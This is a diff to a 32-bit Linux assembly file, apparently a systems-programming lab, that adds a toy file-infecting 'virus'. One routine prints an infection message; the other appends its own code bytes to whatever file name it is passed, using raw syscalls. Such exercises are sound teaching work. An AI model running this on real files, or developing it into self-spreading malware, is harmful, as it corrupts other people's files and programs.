@@ -1,6 +1,12 @@
+section .data
+    inf_msg db 'Hello, Infected File', 10   ; The infection message with a newline
+    inf_len equ $ - inf_msg                 ; Length of the message
+
 section .text
 global _start
 global system_call
+global infection        ; Make it callable from C
+global infector         ; Make it callable from C
 extern main
 _start:
     pop    dword ecx    ; ecx = argc
@@ -38,3 +44,69 @@ system_call:
     add     esp, 4          ; Restore caller state
     pop     ebp             ; Restore caller state
     ret                     ; Back to caller
+
+; ==========================================================
+; VIRUS CODE BOUNDARY START
+; ==========================================================
+code_start:
+
+; ----------------------------------------------------------
+; void infection()
+; Prints the infection message to standard output
+; ----------------------------------------------------------
+infection:
+    push    ebp
+    mov     ebp, esp
+    pushad              ; Save registers
+
+    mov     eax, 4      ; sys_write (4)
+    mov     ebx, 1      ; stdout (1)
+    mov     ecx, inf_msg; Pointer to message
+    mov     edx, inf_len; Length of message
+    int     0x80
+
+    popad               ; Restore registers
+    pop     ebp
+    ret
+
+; ----------------------------------------------------------
+; void infector(char* file_name)
+; Appends the virus code to the provided file
+; ----------------------------------------------------------
+infector:
+    push    ebp
+    mov     ebp, esp
+    pushad
+
+    ; 1. sys_open: open(file_name, O_WRONLY | O_APPEND, 0644)
+    mov     eax, 5          ; sys_open (5)
+    mov     ebx, [ebp+8]    ; Arg 1: file_name (from the C stack)
+    mov     ecx, 1025       ; Arg 2: O_WRONLY (1) | O_APPEND (1024) = 1025
+    mov     edx, 0644o      ; Arg 3: Mode/Permissions (Octal 0644)
+    int     0x80
+
+    ; Check for error (if eax < 0)
+    cmp     eax, 0
+    jl      .end_infector   ; If file doesn't exist or permissions fail, abort
+
+    mov     ebx, eax        ; Save the returned file descriptor into ebx
+
+    ; 2. sys_write: write(fd, code_start, code_end - code_start)
+    mov     eax, 4          ; sys_write (4)
+    mov     ecx, code_start ; Arg 2: Pointer to the start of our virus code
+    mov     edx, code_end - code_start ; Arg 3: The dynamic size of the virus code
+    int     0x80
+
+    ; 3. sys_close: close(fd)
+    mov     eax, 6          ; sys_close (6)
+    int     0x80
+
+.end_infector:
+    popad
+    pop     ebp
+    ret
+
+; ==========================================================
+; VIRUS CODE BOUNDARY END
+; ==========================================================
+code_end:
